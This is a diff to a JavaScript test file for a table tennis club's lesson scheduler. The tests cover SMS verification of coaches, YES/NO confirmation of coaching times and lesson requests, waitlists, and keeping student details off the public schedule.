-  assert.deepEqual(dee(), ['CTTC: Reply YES to update Coach D\'s coaching times, or NO to cancel. Add: Fri Oct 16 7:00-8:00 PM, 8:00-8:30 PM. Nothing changes until you reply.'],
+  assert.deepEqual(dee(), ['CTTC: Reply YES to update Coach Dee\'s coaching times, or NO to cancel. Add: Fri Oct 16 7:00-8:00 PM, 8:00-8:30 PM. Nothing changes until you reply.'],
     'one text, sent as a reply to the coach\'s own text');
   assert.equal(run('coachBoard', deeId).pending.length, 2);
   assert.ok(run('coachBoard', deeId).pendingSince);
   assert.equal(deeLive().length, 0, 'times waiting for the YES are hidden from students');
-  assert.ok(!grids.Schedule.some(line => line[4] === 'Coach D'), 'and from the public Sheet');
+  assert.ok(!grids.Schedule.some(line => line[4] === 'Coach Dee'), 'and from the public Sheet');
   assert.match(propose(deeId, deeSet.slice(0, 1)).message, /a few minutes ago/, 'a second list has to wait ten minutes, so a stranger cannot spam the phone');
   assert.equal(run('coachList').coaches.find(coach => coach.id === deeId).registered, false, 'sending a list alone is not verification');
 
   // Her text to the club number verifies her at the next check. Only a YES from this coach's phone, sent after the question, counts.
   check();
   assert.equal(run('coachList').coaches.find(coach => coach.id === deeId).registered, true, 'her COACH text gives Coach D the green check');
-  assert.deepEqual(verifiedTo('Dee Coach'), ['CTTC: Thanks, you are verified as Coach D. To offer coaching times, open concordtabletennisclub.com/coaching.html, ' +
+  assert.deepEqual(verifiedTo('Dee Coach'), ['CTTC: Thanks, you are verified as Coach Dee. To offer coaching times, open concordtabletennisclub.com/coaching.html, ' +
     'tap I am a coach and pick Coach D. We will text you here to confirm your times and lesson requests.']);
   assert.equal(deeLive().length, 0, 'a YES sent before the question does not count');
   inbound('Dee Coach', 'Yes, but call me', clock + 1000);
@@ -747,9 +760,9 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   assert.equal(dee().length, 1);
   say('(925) 555-0142', 'Yes.');
   assert.deepEqual(deeLive().map(entry => [entry.start, entry.minutes]), [['19:00', 50], ['20:00', 25]], 'a YES from the number on the list publishes the listed times');
-  assert.equal(dee()[1], 'CTTC: Done. Coach D now has 2 upcoming coaching times (2 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
+  assert.equal(dee()[1], 'CTTC: Done. Coach Dee now has 2 upcoming coaching times (2 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
   assert.equal(run('coachBoard', deeId).pending, null);
-  assert.ok(grids.Schedule.some(line => line[4] === 'Coach D' && line[5] === 'Open'), 'and they appear on the public Sheet');
+  assert.ok(grids.Schedule.some(line => line[4] === 'Coach Dee' && line[5] === 'Open'), 'and they appear on the public Sheet');
   assertPublicIsAnonymous();
   gmailQueries.length = 0;
   check();
@@ -763,9 +776,9 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   assert.equal(dee()[3], 'CTTC: OK, nothing was changed. Your coaching times stay as they were.');
   assert.equal(deeLive().length, 2);
   assert.equal(propose(deeId, deeSet.slice(0, 1)).ok, true);
-  assert.equal(dee()[4], 'CTTC: Reply YES to update Coach D\'s coaching times, or NO to cancel. Remove: Fri Oct 16 8:00-8:30 PM. Nothing changes until you reply.');
+  assert.equal(dee()[4], 'CTTC: Reply YES to update Coach Dee\'s coaching times, or NO to cancel. Remove: Fri Oct 16 8:00-8:30 PM. Nothing changes until you reply.');
   say('Dee Coach', 'YES');
-  assert.equal(dee()[5], 'CTTC: Done. Coach D now has 1 upcoming coaching time (0 added, 1 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
+  assert.equal(dee()[5], 'CTTC: Done. Coach Dee now has 1 upcoming coaching time (0 added, 1 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
   assert.equal(deeLive().length, 1);
 
   // A list nobody answers within a day lapses.
@@ -793,8 +806,8 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
 
   // A student request: the coach is asked by text, one question at a time, and answers YES or NO.
   const tex = book(form(deeLive()[0], { name: 'Tex Student', email: 'tex@example.com' }));
-  assert.equal(dee()[dee().length - 1], 'CTTC: Lesson request from Tex Student (' + tex.label + '): 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.');
-  assert.ok(mailTo('dee@example.com').some(message => /Tex Student/.test(message.subject) && /Reply YES to this email to confirm/.test(message.body)), 'the email goes out as well');
+  assert.equal(dee()[dee().length - 1], 'CTTC: Lesson request from Tex Student: 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.');
+  assert.ok(mailTo('dee@example.com').some(message => /Tex Student/.test(message.subject) && /Reply YES: Confirm the lesson/.test(message.body)), 'the email goes out as well');
   const asked = dee().length;
   context.sweep();
   context.sweep();
@@ -803,17 +816,17 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   assert.equal(dee().length, asked, 'a second request waits while the first question is fresh');
   clock += 11 * 60000;
   context.sweep();
-  assert.equal(dee()[dee().length - 1], 'CTTC: Lesson request from Uma Student (' + uma.label + '): 25 min, Fri Oct 16, 8:00 PM, Table 1. Reply YES to confirm or NO to decline.',
+  assert.equal(dee()[dee().length - 1], 'CTTC: Lesson request from Uma Student: 25 min, Fri Oct 16, 8:00 PM, Table 1. Reply YES to confirm or NO to decline.',
     'after ten minutes a new request is asked anyway');
   say('Dee Coach', 'YES');
   assert.equal(statusOf('uma@example.com'), 'confirmed', 'the YES answers the latest question');
   assert.equal(statusOf('tex@example.com'), 'pending');
   assert.deepEqual(dee().slice(-2), [
     'CTTC: Confirmed. ' + uma.label + ', 25 min lesson Fri Oct 16, 8:00 PM, Table 1, Walnut Creek Christian Academy, 2336 Buena Vista Ave, Walnut Creek, CA 94597. Student: Uma Student, uma@example.com.',
-    'CTTC: Still waiting: Lesson request from Tex Student (' + tex.label + '): 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.'
+    'CTTC: Still waiting: Lesson request from Tex Student: 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.'
   ], 'and the earlier question is asked again');
   const umaMail = mailTo('uma@example.com').find(message => /^Lesson confirmed/.test(message.subject));
-  assert.match(umaMail.body, /Coach: Dee Coach, dee@example\.com, \(925\) 555-0142 \(shown on the schedule as Coach D\)/);
+  assert.match(umaMail.body, /Coach: Dee Coach\n[^]*Email: dee@example\.com\nPhone: \(925\) 555-0142/);
   assert.match(umaMail.body, /Table 1/);
   say('Dee Coach', 'NO');
   assert.equal(statusOf('tex@example.com'), 'declined');
@@ -829,8 +842,8 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   say('Dee Coach', 'YES');
   assert.equal(statusOf('late@example.com'), 'pending', 'that YES was for the list');
   assert.deepEqual(dee().slice(-2), [
-    'CTTC: Done. Coach D now has 3 upcoming coaching times (1 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.',
-    'CTTC: Still waiting: Lesson request from Late Student (' + late.label + '): 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.'
+    'CTTC: Done. Coach Dee now has 3 upcoming coaching times (1 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.',
+    'CTTC: Still waiting: Lesson request from Late Student: 50 min, Fri Oct 16, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.'
   ]);
   say('Dee Coach', 'YES');
   assert.equal(statusOf('late@example.com'), 'confirmed');
@@ -872,7 +885,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   const ivyView = run('coachBoard', ids.Ivy);
   assert.equal(ivyView.tables, 3);
   assert.deepEqual(ivyView.board.filter(entry => entry.date === date).map(entry => [entry.start, entry.table, entry.coach, entry.mine]),
-    [['15:00', 1, 'Coach E', false], ['15:30', 2, 'Coach F', false], ['15:30', 3, 'Coach G', false], ['16:00', 1, 'Coach I', true]], 'a coach sees which table every other coach has');
+    [['15:00', 1, 'Coach Eve', false], ['15:30', 2, 'Coach Fay', false], ['15:30', 3, 'Coach Gus', false], ['16:00', 1, 'Coach Ivy', true]], 'a coach sees which table every other coach has');
   put('Fay', []);
   put('Ivy', [slot(date, '16:00', 30), slot(date, '15:30', 30, 2)]);
   assert.match(propose(ids.Ivy, [slot(date, '16:00', 30), slot(date, '15:30', 30, 2)]).message, /Nothing changed/);
@@ -889,7 +902,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   // Students see every table in use: who took one (labels only) and which is still open.
   const at = start => run('openSlots').board.filter(entry => entry.date === date && entry.start === start);
   assert.deepEqual(at('17:00').map(entry => [entry.table, entry.coach, entry.time, entry.status]),
-    [[1, 'Coach E', '5:00 PM to 5:25 PM', 'open'], [2, 'Coach F', '5:00 PM to 5:25 PM', 'open'], [3, 'Coach G', '5:00 PM to 5:25 PM', 'open']]);
+    [[1, 'Coach Eve', '5:00 PM to 5:25 PM', 'open'], [2, 'Coach Fay', '5:00 PM to 5:25 PM', 'open'], [3, 'Coach Gus', '5:00 PM to 5:25 PM', 'open']]);
   assert.deepEqual(at('15:00').map(entry => [entry.table, entry.minutes, entry.slot]), [[1, 50, 60]], 'a table keeps its number for the whole slot');
   assert.deepEqual(at('15:30').map(entry => entry.table), [2, 3]);
   assert.deepEqual(run('openSlots').days.filter(day => day.date === date), [{ date, day: 'Saturday, October 24, 2026', start: '15:00', end: '18:00', tables: 3 }]);
@@ -897,14 +910,18 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   assert.equal(run('requestSlot', form(eveFive, { name: 'Wes Student', email: 'wes@example.com', length: 50 })).ok, false, 'a 30 minute time is not a 50 minute lesson');
   const wes = run('requestSlot', form(eveFive, { name: 'Wes Student', email: 'wes@example.com', length: 25 }));
   assert.equal(wes.ok, true);
-  assert.deepEqual(at('17:00').map(entry => [entry.table, entry.status, entry.student, entry.waitlist]), [[1, 'requested', wes.label, true], [2, 'open', '', false], [3, 'open', '', false]], 'Table 1 is held, Tables 2 and 3 are still open at the same time');
-  assert.doesNotMatch(JSON.stringify(run('openSlots').board), /Wes|wes@|Eve|Fay|example/);
+  assert.deepEqual(at('17:00').map(entry => [entry.table, entry.status, entry.student, entry.waitlist]), [[1, 'requested', wes.label, false], [2, 'open', '', false], [3, 'open', '', false]], 'Table 1 is held, Tables 2 and 3 are still open at the same time, so no waitlist yet');
+  assert.doesNotMatch(JSON.stringify(run('openSlots').board), PRIVATE);
 
-  // Waitlist: a taken time can be watched; the watcher is emailed once when it opens again.
+  // Waitlist: a taken time can be watched once no other table is open then; the watcher is emailed once when it opens again.
   const wait = extra => run('joinWaitlist', Object.assign({ key: eveFive.key, email: 'val@example.com' }, extra));
-  assert.equal(wait({ email: 'nope' }).ok, false);
+  assert.match(wait().message, /Another table is open at that time/);
   assert.equal(wait({ key: at('17:00')[1].key }).ok, false, 'an open time is requested, not waitlisted');
   assert.match(wait({ key: at('17:00')[1].key }).message, /open/);
+  assert.equal(run('requestSlot', form(at('17:00')[1], { name: 'Kim Student', email: 'kim@example.com', length: 25 })).ok, true);
+  assert.equal(run('requestSlot', form(at('17:00')[2], { name: 'Ned Student', email: 'ned@example.com', length: 25 })).ok, true);
+  assert.deepEqual(at('17:00').map(entry => entry.waitlist), [true, true, true], 'every table at that time is taken, so each can be watched');
+  assert.equal(wait({ email: 'nope' }).ok, false);
   assert.equal(wait({ key: 'f'.repeat(16) }).ok, false);
   assert.equal(wait({ website: 'x' }).ok, true);
   assert.equal(grids.Waitlist.length, 1, 'the honeypot adds nothing');
@@ -921,7 +938,8 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   const told = sent.filter(message => /time you wanted/.test(message.subject));
   assert.equal(told.length, 10, 'everyone waiting is told at once');
   assert.ok(told.some(message => message.to === 'val@example.com'));
-  assert.match(told[0].body, /Coach E at Table 1 on Saturday, October 24, 2026, 5:00 PM to 5:25 PM Pacific Time/);
+  assert.match(told[0].body, /When: Saturday, October 24, 2026, 5:00 PM to 5:25 PM Pacific Time\nCoach: Coach Eve\nTable: Table 1/);
+  assert.match(told[0].htmlBody, /#e3f1e7[^"]*"><strong>&#9733; JUST OPENED<\/strong><br>Coach Eve/, 'the open time is marked on the schedule');
   assert.equal(grids.Waitlist.length, 1, 'and taken off the list');
   context.sweep();
   assert.equal(sent.filter(message => /time you wanted/.test(message.subject)).length, 10, 'never twice');
@@ -946,7 +964,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   const piaPhone = '"(925) 555-0123 (SMS)" <19255550100.19255550123.abc@txt.voice.google.com>';
   const pia = () => textsTo('(925) 555-0123');
   const studentRow = () => grids.Students.find(line => line[1] === 'pia@example.com');
-  const abeSlot = () => run('openSlots').slots.find(entry => entry.coach === 'Coach A2');
+  const abeSlot = () => run('openSlots').slots.find(entry => entry.coach === 'Coach Abe');
   assert.equal(run('requestSlot', form(abeSlot(), { name: 'Pia Student', email: 'pia@example.com', phone: '555-12' })).ok, false, 'a number that is not a US mobile is refused');
   const piaFirst = run('requestSlot', form(abeSlot(), { name: 'Pia Student', email: 'pia@example.com', phone: '(925) 555-0123' }));
   assert.equal(piaFirst.ok, true);
@@ -968,7 +986,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   inbound('(925) 555-0123', 'Student', clock + 2000, piaPhone);
   check();
   assert.equal(textsTo('Someone Else').length, 0, 'a number nobody gave gets no answer');
-  assert.deepEqual(pia(), ['CTTC: You will get texts about coaching updates for ' + piaFirst.label + ', such as cancellations. Text STOP to stop.']);
+  assert.deepEqual(pia(), ['CTTC: You will get texts about your coaching lessons, such as cancellations. Text STOP to stop.']);
   assert.equal(cell('Students', studentRow(), 'texts'), 'yes');
   check();
   assert.equal(pia().length, 1, 'the same text is answered once');
@@ -976,7 +994,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   say('Abe Coach', 'YES');
   assert.equal(statusOf('pia@example.com'), 'cancelled', 'her second request was the one she said NO to');
   assert.equal(cell('Requests', requestBy('pia@example.com')[0], 'status'), 'confirmed');
-  assert.equal(pia()[1], 'CTTC: ' + piaFirst.label + ', your lesson with Coach A2 on Sat Oct 17, 4:00 PM is confirmed. Coach: Abe Coach, abe@example.com, (925) 555-0161.',
+  assert.equal(pia()[1], 'CTTC: ' + piaFirst.label + ', your lesson with Coach Abe on Sat Oct 17, 4:00 PM is confirmed. Coach: Abe Coach, abe@example.com, (925) 555-0161.',
     "sent as a reply to the student's own text, with the coach's contact details");
   assert.match(textsTo('Abe Coach').join('\n'), /Student: Pia Student, pia@example\.com, \(925\) 555-0123\./, "the coach gets the student's mobile number too");
   assert.match(mailTo('abe@example.com').find(message => /^Lesson confirmed/.test(message.subject)).body, /Student: Pia Student, pia@example\.com, \(925\) 555-0123/);
@@ -993,11 +1011,11 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   // A new request is asked by text too.
   const third = run('requestSlot', form(abeSlot(), { name: 'Pia Student', email: 'pia@example.com' }));
   assert.match(third.message, /^Almost done: we emailed you and texted your mobile\. Reply YES to either one within 2 hours/);
-  assert.match(pia()[4], new RegExp('^CTTC: Reply YES to send ' + piaFirst.label + '\'s request to Coach A2: 25 min, Sat Oct 17, 4:00 PM, Table 1\\. Reply NO to cancel it\\.$'));
+  assert.match(pia()[4], new RegExp('^CTTC: Reply YES to send ' + piaFirst.label + '\'s request to Coach Abe: 25 min, Sat Oct 17, 4:00 PM, Table 1\\. Reply NO to cancel it\\.$'));
   say('(925) 555-0123', 'YES', piaPhone);
   assert.equal(statusOf('pia@example.com'), 'pending', 'her texted YES sends it to the coach');
   say('Abe Coach', 'NO');
-  assert.doesNotMatch(pia().filter((body, index) => index !== 1).join(' '), /Pia|pia@|Abe|[?]t=/, 'labels only in a text, except the confirmation');
+  assert.doesNotMatch(pia().filter((body, index) => index !== 1).join(' '), /Pia Student|pia@|Abe Coach|[?]t=/, 'first names only in a text, except the confirmation');
   const piaCount = pia().length;
   context.sweep();
   assert.equal(pia().length, piaCount, 'never repeated');
